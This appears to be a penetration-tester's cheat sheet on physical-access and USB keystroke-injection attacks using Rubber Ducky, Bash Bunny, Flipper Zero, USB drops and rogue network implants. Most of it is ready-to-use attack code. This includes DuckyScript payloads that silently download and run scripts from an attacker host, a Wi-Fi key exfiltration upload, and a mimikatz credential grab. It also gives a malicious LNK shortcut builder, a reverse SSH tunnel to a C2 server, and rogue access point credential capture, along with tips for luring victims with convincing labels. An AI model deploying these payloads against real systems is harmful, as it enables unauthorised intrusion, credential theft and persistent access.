## Physical Access & HID

Physical access vectors — USB drops, HID injection, rogue devices.

---

### Rubber Ducky

USB device that emulates a keyboard. Injects keystrokes at high speed when plugged in. The target system sees it as a standard USB keyboard.

https://shop.hak5.org/products/usb-rubber-ducky

#### DuckyScript Basics

DuckyScript is the scripting language for Rubber Ducky payloads.

```
REM Open PowerShell and execute reverse shell
DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden -ep bypass
ENTER
DELAY 1000
STRING IEX (New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/payload.ps1')
ENTER
```

#### Common DuckyScript Commands

| Command | Description |
|---|---|
| `DELAY <ms>` | Wait (milliseconds) |
| `STRING <text>` | Type text |
| `ENTER` | Press Enter |
| `GUI r` | Win+R (Run dialog) |
| `GUI` | Windows key |
| `ALT F4` | Close window |
| `CTRL SHIFT ESC` | Task Manager |
| `TAB` | Tab key |
| `UPARROW` / `DOWNARROW` | Arrow keys |

#### Common Payloads

**Reverse shell (PowerShell):**

```
DELAY 2000
GUI r
DELAY 500
STRING powershell -w hidden -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/shell.ps1')"
ENTER
```

**Wi-Fi credential exfiltration:**

```
DELAY 2000
GUI r
DELAY 500
STRING cmd /c netsh wlan export profile key=clear folder=C:\Users\Public & powershell -c "(New-Object Net.WebClient).UploadFile('http://<ATTACKER_IP>/upload', (Get-ChildItem C:\Users\Public\*.xml))"
ENTER
```

**Credential grab (mimikatz):**

```
DELAY 2000
GUI r
DELAY 500
STRING powershell -w hidden Start-Process powershell -Verb runAs -ArgumentList '-ep bypass -c "IEX (New-Object Net.WebClient).DownloadString(''http://<ATTACKER_IP>/mimi.ps1'')"'
ENTER
DELAY 2000
ALT y
```

> [!warning]
> Adjust `DELAY` values for the target machine speed. Too short = missed keystrokes. Too long = suspicious pause with visible windows.

---

### Bash Bunny

Multi-function USB attack tool. Supports HID (keyboard), storage, and Ethernet attack modes. Two payload switch positions for different attacks.

https://shop.hak5.org/products/bash-bunny

#### Attack Modes

| Mode | Variable | Description |
|---|---|---|
| HID | `ATTACKMODE HID` | Keyboard emulation (like Rubber Ducky) |
| Storage | `ATTACKMODE STORAGE` | Mass storage device |
| Ethernet | `ATTACKMODE RNDIS_ETHERNET` (Win) / `ECM_ETHERNET` (Mac/Linux) | Network adapter |
| Combo | `ATTACKMODE HID STORAGE` | Multiple modes simultaneously |

#### Payload Structure

Payloads live in `/payloads/switch1/` and `/payloads/switch2/` on the Bash Bunny.

```sh
#!/bin/bash
# payload.txt — Bash Bunny payload
ATTACKMODE HID STORAGE
LED ATTACK

# Type commands as keyboard
QUACK GUI r
QUACK DELAY 500
QUACK STRING powershell -ep bypass
QUACK ENTER
QUACK DELAY 1000
QUACK STRING Get-Content \\$(hostname)\BashBunny\payloads\switch1\payload.ps1 | IEX
QUACK ENTER

LED FINISH
```

#### Network Attacks (Ethernet Mode)

```sh
#!/bin/bash
# Man-in-the-middle via USB Ethernet
ATTACKMODE RNDIS_ETHERNET HID
LED ATTACK

# Bash Bunny acts as the default gateway
# Capture traffic, poison ARP, etc.
```

---

### Flipper Zero

Multi-tool device for hardware hacking, RFID/NFC, sub-GHz, infrared, and HID attacks.

https://flipperzero.one

#### HID Payloads (BadUSB)

Flipper Zero supports DuckyScript-compatible payloads via its BadUSB feature.

```
REM Flipper Zero BadUSB payload
DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/shell.ps1')"
ENTER
```

Load payloads via SD card: `SD Card/badusb/payload.txt`

#### RFID Cloning

```
# Read and clone common access cards
# Flipper → 125 kHz RFID → Read
# Supports: EM4100, HID Prox, Indala

# Save and emulate the cloned card
# Flipper → 125 kHz RFID → Saved → Emulate
```

#### Sub-GHz

```
# Capture and replay wireless signals (garage doors, gates, etc.)
# Flipper → Sub-GHz → Read → Save → Send
# Note: rolling codes cannot be replayed (only fixed codes)
```

> [!warning]
> Sub-GHz transmission may be illegal in some jurisdictions without authorisation. Only use during authorised engagements.

---

### USB Drops

Weaponised USB drives left in target locations (parking lots, lobbies, mail rooms) for employees to pick up and plug in.

#### LNK-Based Execution (Modern)

USB autorun is disabled by default since Windows 7. Use LNK files instead:

```
USB Drive/
├── Important_Report.lnk    # Shortcut — runs payload
├── payload.dll              # Hidden — actual malicious payload
└── readme.txt               # Decoy — looks legitimate
```

Create the LNK:

```powershell
$wsh = New-Object -ComObject WScript.Shell
$lnk = $wsh.CreateShortcut("E:\Important_Report.lnk")
$lnk.TargetPath = "C:\Windows\System32\rundll32.exe"
$lnk.Arguments = "E:\payload.dll,EntryPoint"
$lnk.IconLocation = "C:\Windows\System32\shell32.dll,1"
$lnk.Save()
```

#### Autorun (Legacy — Pre-Windows 7)

```ini
; autorun.inf — only works on unpatched pre-Win7 systems
[autorun]
open=payload.exe
icon=icon.ico
label=Company USB
```

> [!info]
> Modern USB drop attacks rely on curiosity — users open files manually. Label the USB drive convincingly ("HR Confidential", "Salary Review 2025").

---

### Rogue Devices

Hardware implants placed on the target network during physical access.

#### LAN Turtle

USB Ethernet adapter with embedded Linux for persistent network access.

https://shop.hak5.org/products/lan-turtle

```sh
# Provides:
# - Reverse SSH tunnel for persistent access
# - Man-in-the-middle (mitmproxy)
# - DNS spoofing
# - Network reconnaissance (nmap)

# Access via SSH
ssh root@172.16.84.1
# Configure reverse SSH tunnel to C2
autossh -M 0 -o "ServerAliveInterval 30" -R 2222:localhost:22 user@c2server.com
```

#### Shark Jack

Portable network attack tool. Plug into an Ethernet port for automated recon or exploitation.

```sh
#!/bin/bash
# payload.sh — Shark Jack
NETMODE NAT
LED ATTACK

# Scan the local network
nmap -sn 10.0.0.0/24 -oN /root/loot/scan.txt

LED FINISH
```

#### Rogue Access Point

Create a fake Wi-Fi network to capture credentials or perform MitM.

```sh
# hostapd-wpe — Rogue AP with WPA-Enterprise credential capture
sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf

# Or use eaphammer
sudo python3 eaphammer --bssid 00:11:22:33:44:55 --essid "CorpWiFi" --channel 6 --interface wlan0 --auth wpa-enterprise --creds
```

> [!warning]
> Rogue devices should be placed discreetly and retrieved after the engagement. Document placement locations for the report.
